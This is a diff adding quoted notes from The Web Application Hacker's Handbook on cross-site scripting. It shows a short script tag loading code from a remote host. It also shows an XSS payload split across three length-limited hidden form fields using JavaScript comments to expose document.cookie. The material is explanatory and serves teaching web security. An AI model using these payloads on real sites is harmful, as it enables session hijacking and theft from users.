@@ -5,3 +5,23 @@ Alternatively, if you are injecting straight into HTML, the following 30-byte ta
 server with hostname a: <script src=http://a></script>
 
 Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12639-12646). Wiley. Kindle Edition. 
+
+span an attack payload across multiple different locations where user-controllable input is inserted into the same 
+returned page. For example, consider the following URL:
+https://wahh-app.com/account.php?page_id=244&seed=129402931&mode=normal
+ It returns a page containing the following: 
+<input type="hidden" name="page_id" value="244">
+<input type="hidden" name="seed" value="129402931">
+<input type="hidden" name="mode" value="normal">
+ Suppose that each field has length restrictions, such that no feasible attack string can be inserted into any of them. Nevertheless, you can still deliver a working exploit by using the following URL to span a script across the three locations you control: https://myapp.com/account.php?page_id="><script>/*&seed=*/alert(document
+.cookie);/*&mode=*/</script>
+ When the parameter values from this URL are embedded into the page, the result is the following: 
+<input type="hidden" name="page_id" value=""><script>/*">
+<input type="hidden" name="seed" value="*/alert(document.cookie);/*">
+<input type="hidden" name="mode" value="*/</script>">
+
+The resulting HTML is valid and is equivalent to only the portions in bold. The chunks of source code in between have
+effectively become JavaScript comments (surrounded by the /* and */ markers), so the browser ignores them. Hence, 
+your script is executed just as if it had been inserted whole at one location within the page.
+Stuttard, Dafydd. The Web Application Hacker's Handbook (Kindle Locations 12678-12682). Wiley. Kindle Edition. 
+
